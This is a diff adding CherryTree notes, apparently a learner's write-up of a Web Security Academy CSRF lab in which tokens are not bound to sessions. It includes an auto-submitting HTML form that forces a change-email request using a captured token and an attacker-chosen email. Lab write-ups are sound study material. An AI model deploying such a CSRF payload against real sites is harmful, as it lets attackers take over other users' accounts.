@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="41" master_id="0" name="3. u_token != session_token" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747572017" ts_lastsave="1747575147">
+    <rich_text>All that you need is to have a valid csfr token and the session token of the user u want to attack but they are not linked
+
+Find your valid csfr token in broswer
+
+
+Copy your valid CSFR token
+Use it to change the email of a differernt session: (other account), test:
+
+
+write script: although be careful, csfr tokens only valid once, so each time they get sent u need log in again and grab a fresh token
+
+
+
+
+
+</rich_text>
+    <encoded_png char_offset="162" justification="left" link="" sha256sum="ce62236c2dd5b8a5cc78e5fabad6a3213e10e1cc807bb28e6c15c8529d62dd4b"/>
+    <encoded_png char_offset="267" justification="left" link="" sha256sum="2002bef8151f96e0b4d27c0121f2f15def619ab2fb74a3657e6bf7e34960f2dc"/>
+    <codebox char_offset="404" justification="left" frame_width="1971" frame_height="100" width_in_pixels="1" syntax_highlighting="html" highlight_brackets="1" show_line_numbers="0">        &lt;form action="https://0ab200ef042d536380911c1e00cb00c1.web-security-academy.net/my-account/change-email" method="POST"&gt;&#13;
+            &lt;input type="hidden" name="email" value="pwned@evil-user.net" /&gt;&#13;
+            &lt;input type="hidden" name="csrf" value="83DAKnkGycTjIK2e5Ix8w56KKTrqZZiE"&gt;&#13;
+        &lt;/form&gt;&#13;
+        &lt;script&gt;&#13;
+            document.forms[0].submit();&#13;
+        &lt;/script&gt;&#13;</codebox>
+  </node>
+</cherrytree>
